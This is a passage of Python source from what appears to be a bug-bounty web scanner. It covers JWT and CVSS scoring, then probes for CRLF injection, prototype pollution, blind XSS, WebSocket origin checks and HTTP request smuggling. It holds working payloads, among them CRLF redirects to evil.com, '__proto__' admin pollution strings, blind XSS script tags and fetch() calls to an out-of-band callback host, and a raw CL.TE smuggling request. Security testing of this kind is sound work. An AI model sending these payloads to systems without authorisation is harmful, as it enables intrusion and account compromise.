        sensitive_keys = ["password", "passwd", "secret", "ssn", "credit", "card", "cvv", "pin"]
        for k, v in payload.items():
            if any(sk in k.lower() for sk in sensitive_keys):
                findings.append({
                    "type": "jwt_sensitive_claim",
                    "severity": "HIGH",
                    "message": f"Sensitive payload claim '{k}' — data exposed in readable JWT body",
                    "key": k,
                })

        return {
            "algorithm": alg.upper(),
            "header": header,
            "payload": payload,
            "findings": findings,
            "summary": f"{len(findings)} issue(s) found",
        }

    def format_report(self, result: Dict) -> str:
        if "error" in result:
            return f"  ❌ JWT Scan Error: {result['error']}"
        lines = [
            f"🔑 JWT Scanner",
            f"  Algorithm : {result.get('algorithm','?')}",
            f"  Summary   : {result.get('summary','?')}",
            "═" * 55,
        ]
        for f in result.get("findings", []):
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡",
                    "LOW": "🟢", "INFORMATIONAL": "ℹ️"}.get(f["severity"], "•")
            lines.append(f"  {icon} [{f['severity']}] {f['message']}")
            if "secret" in f:
                lines.append(f"       Secret     : {f['secret']}")
            if "forged_token" in f:
                lines.append(f"       Forged Token: {f['forged_token'][:80]}...")
            if "test_hint" in f:
                lines.append(f"       Hint       : {f['test_hint'][:120]}")
        if not result.get("findings"):
            lines.append("  ✅ No JWT vulnerabilities detected")
        return "\n".join(lines)

    def scan_url(self, url: str) -> str:
        """Auto-detect JWTs at a URL and scan them."""
        tokens = self.detect_jwt_in_response(url)
        if not tokens:
            return f"  ℹ️  No JWT tokens detected at {url} (check auth headers / cookies)"
        lines = [f"🔑 JWT Scan: {url}", f"  {len(tokens)} token(s) detected", "═" * 55]
        for i, token in enumerate(tokens[:3], 1):
            lines.append(f"\n  Token #{i}: {token[:50]}...")
            result = self.scan_token(token)
            lines.append(self.format_report(result))
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 12. CVSS 3.1 CALCULATOR
# ══════════════════════════════════════════════════════════════════════════════

class CVSS31Calculator:
    """
    CVSS 3.1 Base Score calculator.
    Takes a vector string like AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    and returns the numeric score + qualitative rating.
    """

    # Metric weights per CVSS 3.1 spec
    METRICS = {
        "AV":  {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.20},
        "AC":  {"L": 0.77, "H": 0.44},
        "PR":  {"N": 0.85, "L": 0.62, "H": 0.27},  # Unchanged scope
        "PR_C":{"N": 0.85, "L": 0.68, "H": 0.50},  # Changed scope
        "UI":  {"N": 0.85, "R": 0.62},
        "S":   {"U": "unchanged", "C": "changed"},
        "C":   {"N": 0.00, "L": 0.22, "H": 0.56},
        "I":   {"N": 0.00, "L": 0.22, "H": 0.56},
        "A":   {"N": 0.00, "L": 0.22, "H": 0.56},
    }

    def _parse_vector(self, vector: str) -> Dict:
        """Parse CVSS vector string into metric dict."""
        vector = vector.strip()
        if vector.startswith("CVSS:3.1/"):
            vector = vector[9:]
        elif vector.startswith("CVSS:3.0/"):
            vector = vector[9:]
        parts = {}
        for item in vector.split("/"):
            if ":" in item:
                k, v = item.split(":", 1)
                parts[k.upper()] = v.upper()
        return parts

    def calculate(self, vector: str) -> Dict:
        """Calculate CVSS 3.1 base score from a vector string."""
        try:
            m = self._parse_vector(vector)
            required = ["AV", "AC", "PR", "UI", "S", "C", "I", "A"]
            for r in required:
                if r not in m:
                    return {"error": f"Missing metric: {r}"}

            scope_changed = m["S"] == "C"
            pr_key = "PR_C" if scope_changed else "PR"

            av  = self.METRICS["AV"][m["AV"]]
            ac  = self.METRICS["AC"][m["AC"]]
            pr  = self.METRICS.get(pr_key, self.METRICS["PR"])[m["PR"]]
            ui  = self.METRICS["UI"][m["UI"]]
            c   = self.METRICS["C"][m["C"]]
            i   = self.METRICS["I"][m["I"]]
            a   = self.METRICS["A"][m["A"]]

            # ISS = Impact Sub Score
            iss = 1 - ((1 - c) * (1 - i) * (1 - a))
            # Impact
            if not scope_changed:
                impact = 3.4904 * (iss ** 1.4960)
            else:
                impact = 7.5265 * (iss - 0.2288)

            if impact <= 0:
                base = 0.0
            else:
                exploitability = 8.22 * av * ac * pr * ui
                if not scope_changed:
                    raw = min(impact + exploitability, 10)
                else:
                    raw = min(1.0816 * (impact + exploitability), 10)
                # Round up to 1 decimal
                import math
                base = math.ceil(raw * 10) / 10

            # Rating
            if base == 0.0:
                rating = "None"
            elif base < 4.0:
                rating = "Low"
            elif base < 7.0:
                rating = "Medium"
            elif base < 9.0:
                rating = "High"
            else:
                rating = "Critical"

            return {
                "score": base,
                "rating": rating,
                "vector": f"CVSS:3.1/{vector.lstrip('CVSS:3.1/').lstrip('CVSS:3.0/')}",
                "metrics": m,
            }
        except (KeyError, ValueError) as e:
            return {"error": f"Invalid vector metric: {e}"}

    def interactive_build(self) -> str:
        """Return guidance for building a CVSS 3.1 vector string."""
        return """
🎯 CVSS 3.1 Vector Builder

Format: AV:<v>/AC:<v>/PR:<v>/UI:<v>/S:<v>/C:<v>/I:<v>/A:<v>

  AV (Attack Vector)      : N=Network, A=Adjacent, L=Local, P=Physical
  AC (Attack Complexity)  : L=Low, H=High
  PR (Privileges Required): N=None, L=Low, H=High
  UI (User Interaction)   : N=None, R=Required
  S  (Scope)              : U=Unchanged, C=Changed
  C  (Confidentiality)    : N=None, L=Low, H=High
  I  (Integrity)          : N=None, L=Low, H=High
  A  (Availability)       : N=None, L=Low, H=High

Examples:
  RCE (max)    : AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0 Critical
  SQLi         : AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
  Stored XSS   : AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N → 5.4 Medium
  Open Redirect: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N → 6.1 Medium
  Missing HSTS : AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N → 4.2 Medium
""".strip()

    def format_report(self, result: Dict) -> str:
        if "error" in result:
            return f"  ❌ CVSS Error: {result['error']}\n{self.interactive_build()}"
        icons = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🟢", "None": "⬜"}
        icon = icons.get(result["rating"], "•")
        lines = [
            f"📊 CVSS 3.1 Score",
            f"  {icon} {result['score']} {result['rating']}",
            f"  Vector: {result['vector']}",
            "  Metrics:",
        ]
        labels = {
            "AV": "Attack Vector", "AC": "Attack Complexity",
            "PR": "Privileges Required", "UI": "User Interaction",
            "S":  "Scope", "C": "Confidentiality",
            "I":  "Integrity", "A": "Availability",
        }
        for k, v in result.get("metrics", {}).items():
            lines.append(f"    {labels.get(k, k):25}: {v}")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# HELPERS: CRLFProbe, PrototypePollutionProbe, BlindXSSEngine,
#          GitHubReconEngine, WebhookNotifier
# ══════════════════════════════════════════════════════════════════════════════

class CRLFProbe:
    """
    CRLF / HTTP Response Splitting probe.
    Tests for CR (\\r) and LF (\\n) injection in URL paths and query parameters.
    """

    PAYLOADS = [
        "%0d%0aX-Injected: crlf-test",
        "%0aX-Injected: crlf-test",
        "%0d%0a%20X-Injected: crlf-test",
        "%E5%98%8A%E5%98%8DX-Injected: crlf-test",   # Unicode CRLF
        "%0d%0aSet-Cookie: crlf_test=1",
        "%0d%0aLocation: https://evil.com",
    ]

    def probe(self, url: str, param: str = None) -> List[Dict]:
        """
        Test a URL for CRLF injection.
        If param given: inject into query param. Otherwise inject into path.
        """
        from urllib.parse import urlparse as _up, urlencode as _ue
        findings = []
        base = url.rstrip("/")
        parsed = _up(url)

        for payload in self.PAYLOADS:
            try:
                if param:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{_ue({param: payload})}"
                else:
                    # Inject into path
                    test_url = f"{base}/{payload}"

                resp = _get(test_url, timeout=8, allow_redirects=False)
                if not resp:
                    continue

                # Check if injection appears in response headers
                for k, v in resp.headers.items():
                    if "crlf-test" in v.lower() or "x-injected" in k.lower():
                        findings.append({
                            "type": "crlf_injection",
                            "severity": "MEDIUM",
                            "url": test_url,
                            "payload": payload,
                            "reflected_header": f"{k}: {v}",
                            "message": f"CRLF injection reflected in response header '{k}'",
                        })
                        break

                # Also check for redirect to evil.com
                if resp.status_code in [301, 302, 303, 307, 308]:
                    loc = resp.headers.get("Location", "")
                    if "evil.com" in loc:
                        findings.append({
                            "type": "crlf_header_injection_redirect",
                            "severity": "HIGH",
                            "url": test_url,
                            "payload": payload,
                            "location": loc,
                            "message": f"CRLF injection triggered redirect to {loc}",
                        })
            except Exception:
                continue
        return findings

    def format_report(self, findings: List[Dict]) -> str:
        if not findings:
            return "  ✅ No CRLF injection found"
        lines = [f"🔀 CRLF Injection — {len(findings)} finding(s)", "═" * 55]
        for f in findings:
            icon = "🟠" if f["severity"] == "HIGH" else "🟡"
            lines.append(f"  {icon} [{f['severity']}] {f['message']}")
            lines.append(f"       Payload: {f['payload'][:60]}")
        return "\n".join(lines)


class PrototypePollutionProbe:
    """
    Prototype Pollution detection for JavaScript-heavy targets.
    Tests ?__proto__[x]=1, ?constructor[prototype][x]=1, etc.
    """

    PAYLOADS = [
        {"__proto__[polluted]": "yes"},
        {"constructor[prototype][polluted]": "yes"},
        {"__proto__": '{"polluted":"yes"}'},
        {"__proto__[admin]": "true"},
        {"__proto__[isAdmin]": "1"},
    ]

    def probe(self, url: str) -> List[Dict]:
        """Test URL for prototype pollution via GET parameters."""
        from urllib.parse import urlencode as _ue
        base = url.split("?")[0]
        findings = []
        for payload_dict in self.PAYLOADS:
            try:
                # Build query string
                qs = "&".join(f"{k}={v}" for k, v in payload_dict.items())
                test_url = f"{base}?{qs}"
                resp = _get(test_url, timeout=8)
                if not resp:
                    continue
                body = resp.text or ""
                # Check if our injected value reflects (crude but common)
                if "polluted" in body.lower() and payload_dict.get("__proto__[polluted]") == "yes":
                    findings.append({
                        "type": "prototype_pollution",
                        "severity": "HIGH",
                        "url": test_url,
                        "payload": qs,
                        "message": "Prototype pollution reflected in response body",
                        "impact": "May lead to RCE in Node.js applications, privilege escalation",
                    })
                # Check for JSON response with polluted key
                try:
                    data = resp.json()
                    if isinstance(data, dict) and "polluted" in str(data):
                        findings.append({
                            "type": "prototype_pollution_json",
                            "severity": "HIGH",
                            "url": test_url,
                            "payload": qs,
                            "message": "Prototype pollution key found in JSON response",
                        })
                except Exception:
                    pass
            except Exception:
                continue
        return findings

    def format_report(self, findings: List[Dict]) -> str:
        if not findings:
            return "  ✅ No prototype pollution indicators found"
        lines = [f"⚡ Prototype Pollution — {len(findings)} finding(s)", "═" * 55]
        for f in findings:
            lines.append(f"  🟠 [{f['severity']}] {f['message']}")
            if "impact" in f:
                lines.append(f"       Impact : {f['impact']}")
            lines.append(f"       Payload: {f['payload'][:80]}")
        return "\n".join(lines)


class BlindXSSEngine:
    """
    Blind / Stored XSS detection via Interactsh OOB callbacks.
    Injects XSS payloads that call back to Interactsh if loaded in a browser/bot.
    """

    def _get_oob(self) -> Dict:
        """Register an Interactsh session."""
        return _interactsh_setup()

    def generate_payloads(self, callback_url: str) -> List[str]:
        """Generate blind XSS payloads targeting the callback URL."""
        return [
            f'"><script src="http://{callback_url}/bxss.js"></script>',
            f"'><img src=x onerror=fetch('http://{callback_url}/bxss')>",
            f"<script>new Image().src='http://{callback_url}/bxss'</script>",
            f'javascript:eval(String.fromCharCode(102,101,116,99,104)("http://{callback_url}/bxss"))',
            f'"><svg onload="fetch(`http://{callback_url}/bxss`)">',
        ]

    def probe(self, url: str, param: str, wait_seconds: int = 10) -> Dict:
        """
        Inject blind XSS payloads and poll Interactsh for callbacks.
        Returns findings dict.
        """
        from urllib.parse import urlencode as _ue
        oob = self._get_oob()
        if not oob.get("ok"):
            return {"error": f"Interactsh unavailable: {oob.get('error')}",
                    "manual_payloads": self.generate_payloads("YOUR-BXSS-SERVER")}

        callback_domain = oob["callback_url"].replace("http://", "").replace("https://", "")
        payloads = self.generate_payloads(callback_domain)
        base = url.split("?")[0]

        injected_urls = []
        for payload in payloads:
            try:
                test_url = f"{base}?{_ue({param: payload})}"
                _get(test_url, timeout=8)
                injected_urls.append(test_url)
            except Exception:
                pass

        # Poll for callbacks
        import time as _t
        _t.sleep(wait_seconds)

        try:
            poll = _get(
                f"{oob['server']}/poll?id={oob['correlation_id']}&secret={oob['correlation_id']}",
                timeout=8
            )
            if poll and poll.status_code == 200:
                data = poll.json() if poll.text else {}
                interactions = data.get("data") or data.get("interactions") or []
                if interactions:
                    return {
                        "confirmed": True,
                        "severity": "HIGH",
                        "type": "blind_xss",
                        "url": url,
                        "param": param,
                        "callback_url": oob["callback_url"],
                        "interactions": interactions[:3],
                        "payloads_injected": len(injected_urls),
                        "message": f"Blind XSS confirmed! OOB callback received at {oob['callback_url']}",
                    }
        except Exception:
            pass

        return {
            "confirmed": False,
            "reason": f"No OOB callback from {oob['callback_url']} after {wait_seconds}s",
            "payloads_injected": len(injected_urls),
            "note": "May still be blind XSS — payload might execute later (check XSS Hunter too)",
        }

    def format_report(self, result: Dict) -> str:
        if "error" in result:
            lines = [f"  ⚠️  Blind XSS: {result['error']}"]
            if "manual_payloads" in result:
                lines.append("  📋 Manual payloads to try:")
                for p in result["manual_payloads"]:
                    lines.append(f"    {p[:100]}")
            return "\n".join(lines)
        if result.get("confirmed"):
            return (f"  🔴 [HIGH] {result['message']}\n"
                    f"       Interactions: {len(result.get('interactions', []))}\n"
                    f"       Callback: {result.get('callback_url')}")
        return (f"  ℹ️  Blind XSS: No OOB callback received.\n"
                f"       {result.get('reason', '')}\n"
                f"       {result.get('note', '')}")


class GitHubReconEngine:
    """
    GitHub public code search for secret leakage.
    Searches for target domain/org in public GitHub repositories.
    Requires GITHUB_TOKEN env var for best results (higher rate limit).
    """

    SEARCH_PATTERNS = [
        '"{domain}" password',
        '"{domain}" api_key',
        '"{domain}" secret',
        '"{domain}" token',
        '"{domain}" apikey',
        '"{domain}" credential',
        'site:{domain} password filetype:env',
    ]

    def _gh_search(self, query: str, token: str = None) -> List[Dict]:
        """Search GitHub code using the public search API."""
        url = "https://api.github.com/search/code"
        headers = {
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "BugBountyHunter/1.0",
        }
        if token:
            headers["Authorization"] = f"token {token}"
        resp = _get(f"{url}?q={quote(query)}&per_page=10", headers=headers, timeout=15)
        if not resp:
            return []
        if resp.status_code == 403:
            return [{"error": "GitHub rate limited — set GITHUB_TOKEN env var"}]
        if resp.status_code != 200:
            return []
        try:
            items = resp.json().get("items", [])
            return [
                {
                    "repo": item.get("repository", {}).get("full_name", "?"),
                    "file": item.get("name", "?"),
                    "path": item.get("path", "?"),
                    "url": item.get("html_url", ""),
                }
                for item in items[:5]
            ]
        except Exception:
            return []

    def recon(self, domain: str) -> str:
        """Search GitHub for secrets related to a domain."""
        token = os.environ.get("GITHUB_TOKEN")
        org = domain.split(".")[0]  # e.g. 'shopify' from 'shopify.com'
        lines = [f"🐙 GitHub Secret Leakage Recon: {domain}", "═" * 55]

        queries = [
            f'"{domain}" password',
            f'"{domain}" api_key OR apikey',
            f'"{org}" secret_key OR SECRET_KEY',
            f'"{domain}" DB_PASSWORD',
        ]

        total_hits = 0
        for query in queries:
            results = self._gh_search(query, token)
            if not results:
                continue
            if isinstance(results[0], dict) and "error" in results[0]:
                lines.append(f"  ⚠️  {results[0]['error']}")
                break
            lines.append(f"\n  🔍 Query: {query}")
            for r in results:
                total_hits += 1
                lines.append(f"    📄 {r['repo']}/{r['file']}")
                lines.append(f"       URL: {r['url']}")

        if total_hits == 0:
            lines.append("  ✅ No obvious secret leakage found in public GitHub repos")
        else:
            lines.append(f"\n  ⚠️  {total_hits} results found — manually review each file!")
            lines.append("  💡 Tip: Set GITHUB_TOKEN for full rate limit (5000 req/hr vs 10)")

        return "\n".join(lines)


class WebhookNotifier:
    """
    Send real-time notifications to Slack or Discord
    when Critical or High severity findings are discovered.
    """

    def _send_slack(self, webhook_url: str, message: str, color: str = "danger") -> bool:
        """Send a Slack webhook notification."""
        payload = {
            "attachments": [{
                "color": color,
                "text": message,
                "mrkdwn_in": ["text"],
            }]
        }
        resp = _post(webhook_url, json_data=payload, timeout=8)
        return resp is not None and resp.status_code in [200, 204]

    def _send_discord(self, webhook_url: str, message: str) -> bool:
        """Send a Discord webhook notification."""
        payload = {"content": message, "username": "BugBountyHunter"}
        resp = _post(webhook_url, json_data=payload, timeout=8)
        return resp is not None and resp.status_code in [200, 204]

    def notify_finding(self, finding: Dict) -> Dict:
        """Send notifications for a finding if severity is Critical or High."""
        severity = finding.get("severity", "").upper()
        if severity not in ["CRITICAL", "HIGH"]:
            return {"sent": False, "reason": "Only Critical/High findings trigger alerts"}

        slack_url = os.environ.get("SLACK_WEBHOOK_URL")
        discord_url = os.environ.get("DISCORD_WEBHOOK_URL")

        if not slack_url and not discord_url:
            return {
                "sent": False,
                "reason": "No SLACK_WEBHOOK_URL or DISCORD_WEBHOOK_URL env var set",
            }

        icon = "🔴" if severity == "CRITICAL" else "🟠"
        msg = (
            f"{icon} *[{severity}] Bug Bounty Finding*\n"
            f"*Title*: {finding.get('title', '?')}\n"
            f"*URL*: {finding.get('url', '?')}\n"
            f"*Type*: {finding.get('type', '?')}\n"
            f"*Program*: {finding.get('program', 'unknown')}\n"
            f"*Logged at*: {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}"
        )

        results = {}
        if slack_url:
            color = "#FF0000" if severity == "CRITICAL" else "#FF7700"
            ok = self._send_slack(slack_url, msg, color)
            results["slack"] = "✅ sent" if ok else "❌ failed"
        if discord_url:
            ok = self._send_discord(discord_url, msg.replace("*", "**"))
            results["discord"] = "✅ sent" if ok else "❌ failed"

        return {"sent": True, "results": results, "message": msg}

    def notify_batch(self, findings: List[Dict]) -> str:
        """Notify for all Critical/High findings in a batch."""
        notified = 0
        for f in findings:
            if f.get("severity", "").upper() in ["CRITICAL", "HIGH"]:
                self.notify_finding(f)
                notified += 1
        if notified:
            return f"  📬 Sent {notified} webhook notification(s) for Critical/High findings"
        return "  ℹ️  No Critical/High findings to notify about"



# ══════════════════════════════════════════════════════════════════════════════
# 13. DOM XSS ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class DOMXSSEngine:
    """
    DOM-based XSS detection via static analysis of JS sinks and sources.
    Does NOT require a browser — uses regex on JS files and HTML.

    Checks for:
      - Dangerous sinks: innerHTML, outerHTML, document.write, eval,
        location.href assignment, location.replace, insertAdjacentHTML
      - User-controlled sources: location.hash, location.search,
        document.referrer, URLSearchParams
    """

    DANGEROUS_SINKS = [
        ("innerHTML",          "HIGH",    "innerHTML = ... allows HTML injection"),
        ("outerHTML",          "HIGH",    "outerHTML = ... allows HTML injection"),
        ("document.write",     "HIGH",    "document.write() renders unsanitized HTML"),
        ("document.writeln",   "HIGH",    "document.writeln() renders unsanitized HTML"),
        ("insertAdjacentHTML", "HIGH",    "insertAdjacentHTML() allows HTML injection"),
        ("eval(",              "CRITICAL","eval() executes arbitrary JS"),
        ("Function(",          "CRITICAL","Function() constructor executes arbitrary JS"),
        ("setTimeout(",        "MEDIUM",  "setTimeout(string) can execute code"),
        ("setInterval(",       "MEDIUM",  "setInterval(string) can execute code"),
        ("location.href",      "MEDIUM",  "location.href = userInput → open redirect / XSS"),
        ("location.replace(",  "MEDIUM",  "location.replace() with user input = open redirect"),
        ("location.assign(",   "MEDIUM",  "location.assign() with user input = open redirect"),
        ("window.open(",       "MEDIUM",  "window.open() with user input = redirect risk"),
        ("$.html(",            "HIGH",    "jQuery .html() renders unsanitized HTML"),
        ("$(",                 "LOW",     "jQuery selector may render unescaped HTML"),
    ]

    USER_SOURCES = [
        "location.hash",
        "location.search",
        "location.href",
        "document.referrer",
        "document.cookie",
        "URLSearchParams",
        "window.name",
        "postMessage",
    ]

    # Pattern: sink appears near a source (within 500 chars)
    SOURCE_PATTERN = re.compile(
        r'(?:' + '|'.join(re.escape(s) for s in [
            "location.hash", "location.search", "document.referrer",
            "URLSearchParams", "window.name", "postMessage",
            "getQueryParam", "getParameter", "decodeURI",
        ]) + r')',
        re.IGNORECASE
    )

    def analyze_js(self, js_text: str, source_url: str = "<inline>") -> List[Dict]:
        """
        Scan JS text for dangerous DOM sink patterns.
        Returns findings with line numbers and context.
        """
        findings = []
        lines = js_text.splitlines()

        for i, line in enumerate(lines, 1):
            # Check for sources in this line
            has_source = bool(self.SOURCE_PATTERN.search(line))

            for sink, severity, description in self.DANGEROUS_SINKS:
                if sink.lower() in line.lower():
                    # Upgrade severity if source is nearby (same line or ±5 lines)
                    ctx_start = max(0, i - 6)
                    ctx_end = min(len(lines), i + 5)
                    ctx_block = "\\n".join(lines[ctx_start:ctx_end])
                    source_nearby = bool(self.SOURCE_PATTERN.search(ctx_block))

                    actual_sev = severity
                    flow_note = ""
                    if source_nearby:
                        if severity == "MEDIUM":
                            actual_sev = "HIGH"
                        elif severity == "LOW":
                            actual_sev = "MEDIUM"
                        flow_note = " [USER INPUT → SINK DATA FLOW DETECTED]"

                    # Skip obvious false positives (commented lines, string literals)
                    stripped = line.strip()
                    if stripped.startswith("//") or stripped.startswith("*"):
                        continue

                    findings.append({
                        "type": "dom_xss",
                        "sink": sink,
                        "severity": actual_sev,
                        "description": description + flow_note,
                        "line": i,
                        "code": line.strip()[:120],
                        "source_url": source_url,
                        "data_flow": source_nearby,
                    })

        # Deduplicate: same sink + same line
        seen = set()
        unique = []
        for f in findings:
            key = (f["sink"], f["line"])
            if key not in seen:
                seen.add(key)
                unique.append(f)

        return unique

    def scan_url(self, url: str) -> str:
        """Fetch a URL and scan all linked JS files for DOM XSS."""
        resp = _get(url, timeout=12)
        if not resp or resp.status_code != 200:
            return f"  ❌ Could not fetch {url}"

        parsed = urlparse(url if url.startswith("http") else "https://" + url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        page_text = resp.text or ""

        # Find all script src
        js_urls = []
        for m in re.finditer(r'src=["\'](.*?\.js(?:\?[^"\']*)?)["\']', page_text, re.I):
            src = m.group(1)
            if src.startswith("http"):
                js_urls.append(src)
            elif src.startswith("//"):
                js_urls.append("https:" + src)
            elif src.startswith("/"):
                js_urls.append(base + src)

        all_findings = []

        # Scan inline scripts
        inline = re.findall(r'<script(?:[^>]*)>(.*?)</script>', page_text, re.DOTALL | re.IGNORECASE)
        for i, block in enumerate(inline):
            all_findings.extend(self.analyze_js(block, f"{url}#inline-{i}"))

        # Scan external JS files (limit to 8)
        for js_url in js_urls[:8]:
            js_resp = _get(js_url, timeout=10)
            if js_resp and js_resp.status_code == 200:
                all_findings.extend(self.analyze_js(js_resp.text or "", js_url))

        return self.format_report(all_findings, url, len(js_urls))

    def format_report(self, findings: List[Dict], url: str = "", js_count: int = 0) -> str:
        """Format DOM XSS findings."""
        if not findings:
            return f"  ✅ No DOM XSS sinks found (scanned {js_count} JS file(s) + inline scripts)"

        # Filter: prioritize confirmed data flows
        confirmed_flows = [f for f in findings if f.get("data_flow")]
        other = [f for f in findings if not f.get("data_flow")]

        lines = [f"🌐 DOM XSS Analysis: {url}", "═" * 60]

        if confirmed_flows:
            lines.append(f"\n  🔴 Confirmed Data Flows ({len(confirmed_flows)}) — USER INPUT → DANGEROUS SINK:")
            for f in confirmed_flows[:10]:
                icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}.get(f["severity"], "•")
                lines.append(f"    {icon} [{f['severity']}] Sink: `{f['sink']}` at line {f['line']}")
                lines.append(f"       File: {f['source_url'].split('/')[-1][:50]}")
                lines.append(f"       Code: {f['code'][:100]}")

        if other:
            lines.append(f"\n  🟡 Potential Sinks ({len(other)}) — Manual Review Needed:")
            for f in other[:8]:
                lines.append(f"    • [{f['severity']}] `{f['sink']}` at line {f['line']} — {f['description'][:80]}")

        lines.append(f"\n  ➜ Use Playwright/headless Chrome to dynamically confirm DOM XSS")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 14. WEBSOCKET ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class WebSocketEngine:
    """
    Basic WebSocket security testing.
    Tests for:
      - Missing authentication (unauthenticated WS connection)
      - Missing Origin check (WS CSRF)
      - Reflected data in messages (WS-XSS)
      - Message-based injection (XSS/SQLi in WS messages)

    Requires: websocket-client (pip install websocket-client)
    Gracefully skips if not installed.
    """

    def _check_ws_available(self):
        try:
            import websocket
            return True
        except ImportError:
            return False

    def test_connection(self, ws_url: str, origin: str = "https://evil.com",
                        timeout: int = 8) -> Dict:
        """
        Attempt to connect to a WebSocket endpoint.
        Returns connection result dict.
        """
        if not self._check_ws_available():
            return {
                "error": "websocket-client not installed. Run: pip install websocket-client",
                "install_hint": "pip install websocket-client",
            }

        import websocket as ws_lib
        result = {
            "url": ws_url,
            "connected": False,
            "accepted_evil_origin": False,
            "messages": [],
            "error": None,
        }

        try:
            ws = ws_lib.create_connection(
                ws_url,
                timeout=timeout,
                header={"Origin": origin},
                suppress_origin=False,
            )
            result["connected"] = True
            result["accepted_evil_origin"] = True  # Connected with evil origin!

            # Try to receive any initial messages
            ws.settimeout(3)
            try:
                msg = ws.recv()
                result["messages"].append({"direction": "recv", "data": str(msg)[:200]})
            except Exception:
                pass

            # Send XSS probe
            xss_payload = "<script>alert('ws-xss')</script>"
            try:
                ws.send(xss_payload)
                ws.settimeout(3)
                response = ws.recv()
                result["messages"].append({"direction": "send", "data": xss_payload})
                result["messages"].append({"direction": "recv", "data": str(response)[:200]})
                if xss_payload.lower() in (response or "").lower():
                    result["xss_reflected"] = True
            except Exception:
                pass

            ws.close()
        except Exception as e:
            result["error"] = str(e)[:200]

        return result

    def discover_ws_endpoints(self, page_url: str) -> List[str]:
        """Scan a page HTML for WebSocket URLs (ws:// or wss://)."""
        resp = _get(page_url, timeout=12)
        if not resp or resp.status_code != 200:
            return []
        text = resp.text or ""
        pattern = re.compile(r'(wss?://[^"\' \t\n<>]{5,100})', re.IGNORECASE)
        endpoints = list(set(pattern.findall(text)))
        return endpoints[:10]

    def scan(self, target: str) -> str:
        """Scan a URL for WebSocket endpoints and test security."""
        if not self._check_ws_available():
            return ("  ⚠️  websocket-client not installed.\n"
                    "  Install with: pip install websocket-client\n"
                    "  Then re-run: /bugbounty websocket <url>")

        lines = [f"🔌 WebSocket Security Scan: {target}", "═" * 55]

        # Discover WS endpoints from page
        if target.startswith("http"):
            ws_urls = self.discover_ws_endpoints(target)
        else:
            ws_urls = [target]

        if not ws_urls:
            lines.append("  ℹ️  No WebSocket endpoints found in page source.")
            lines.append("  💡 Tip: Check browser DevTools Network tab → WS filter")
            return "\n".join(lines)

        lines.append(f"  Found {len(ws_urls)} WebSocket endpoint(s):")
        for ws_url in ws_urls:
            lines.append(f"\n  📡 Testing: {ws_url}")
            result = self.test_connection(ws_url)

            if result.get("error") and not result.get("connected"):
                lines.append(f"    ❌ Connection failed: {result['error'][:80]}")
                continue

            if result.get("accepted_evil_origin"):
                lines.append(f"    🟠 [HIGH] WebSocket accepts connections from cross-origin (evil.com)!")
                lines.append(f"       Impact: WebSocket CSRF — malicious sites can connect as the victim")

            if result.get("xss_reflected"):
                lines.append(f"    🔴 [HIGH] XSS payload reflected back in WebSocket message!")
                lines.append(f"       Impact: WebSocket-based XSS may be exploitable")

            for msg in result.get("messages", [])[:3]:
                direction = "→ SENT" if msg["direction"] == "send" else "← RECV"
                lines.append(f"    {direction}: {msg['data'][:80]}")

        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 15. REQUEST SMUGGLING ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class RequestSmugglingEngine:
    """
    HTTP Request Smuggling detection (CL.TE and TE.CL techniques).

    CL.TE: Frontend uses Content-Length, backend uses Transfer-Encoding.
    TE.CL: Frontend uses Transfer-Encoding, backend uses Content-Length.

    Uses raw sockets for precise header control (requests/httpx cannot do this).
    """

    def _raw_request(self, host: str, port: int, request_bytes: bytes,
                     timeout: int = 10) -> bytes:
        """Send a raw HTTP/HTTPS request and return the response bytes."""
        import socket as _sock
        try:
            if port == 443:
                import ssl
                ctx = ssl.create_default_context()
                sock = ctx.wrap_socket(
                    _sock.create_connection((host, port), timeout=timeout),
                    server_hostname=host
                )
            else:
                sock = _sock.create_connection((host, port), timeout=timeout)
            sock.sendall(request_bytes)
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 16384:
                    break
            sock.close()
            return resp
        except Exception as e:
            logger.debug(f"Raw socket error: {e}")
            return b""

    def test_cl_te(self, url: str) -> Dict:
        """
        CL.TE smuggling probe.
        Sends a request where Content-Length says data is done,
        but Transfer-Encoding chunked carries extra data.
        """
        parsed = urlparse(url if url.startswith("http") else "https://" + url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"

        # CL.TE: Ambiguous request — backend processes the extra 'G'
        # If smuggled, subsequent request will see 'GPOST /...'
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        ).encode()

        start = time.time()
        try:
            resp = self._raw_request(host, port, payload, timeout=10)
            elapsed = time.time() - start
            resp_text = resp.decode("utf-8", errors="replace")

            # Timeout-based detection: server hanging indicates partial body read
            if elapsed > 5 and b"400" not in resp[:50] and b"408" not in resp[:50]:
                return {
                    "technique": "CL.TE",
                    "confirmed": "possible",
                    "evidence": f"Request took {elapsed:.1f}s — possible smuggling hang",
                    "severity": "HIGH",
                    "elapsed": elapsed,
                }
